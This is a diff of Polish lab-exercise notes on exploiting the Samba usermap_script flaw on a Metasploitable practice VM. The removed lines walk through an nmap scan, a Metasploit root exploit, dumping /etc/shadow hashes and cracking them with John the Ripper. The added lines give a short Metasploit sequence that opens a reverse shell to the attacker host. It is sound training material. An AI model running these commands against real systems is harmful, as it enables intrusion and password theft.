@@ -300,36 +300,14 @@ nie zostały poprawnie zainicjalizowane lub zostały usunięte.
 Exploit zdalny
 Wykorzystując exploit/multi/samba/usermap_script przeprowadź skuteczną eksploitację Metasploitable (z uzyskaniem shella).
 
-a)Odpalamy intensywne skanowanie nmapem na wirtualce Metasploitable (od 3 do 5 minut) w wirtualce Kali:
-nmap -p 1-65535 -T4 -A -v metaspl_ip 2>&1 | tee /var/tmp/scan.txt
-b)Szukamy demona samby (zazwyczaj port 139 lub 445):
-cd /var/tmp
-grep -i samba /var/tmp/scan.txt
+use exploit/multi/samba/usermap_script
+set rhost target_ip
+set payload cmd/unix/reverse
+set lhost kali_ip
+exploit
 
-c) wykorzystujemy msfconsole do exploitu demona samby aby uzyskać roota:
-	msfconsole 
-	use exploit/multi/samba/usermap_script
-	set RHOST metaspl_ip
-	exploit 
-	ctrl + Z, yes dla Background session, enter
-	listujemy numer sesji dla następnego kroku: sessions -l
-d) Odczytujemy hashe z pliku /etc/shadow
-	use post/linux/gather/hashdump
-	set session nr_sesji_z_sessions_-l
-	exploit
-	
-	Wypisze się kawałek tekstu. zaznaczamy i kopiujemy fragment za  "Unshadowed Password File"
-	
-e) Używamy John the Ripper żeby złąmać hashe hasła
-	otwieramy nową konsolę w Kali 
-	cd /pentest/passwords/john/
-	./john <skopiowany kawałek tekstu>
-f) Udowadniamy  że exploit zadziałał:
-	cd /root/.msf4/loot
-	ls -lrta
-	
 Efektem exploitu jest uzyskanie shella celu. Można w nim wykonywać
-dowolny kod (co prezentuje np. komenda ls)
+dowolny kod (co prezentuje np. komenda ls, zabraniee info o celu, np. uname -a)
 
 Zapoznaj się z opisem i sposobem działania podatności: 
 
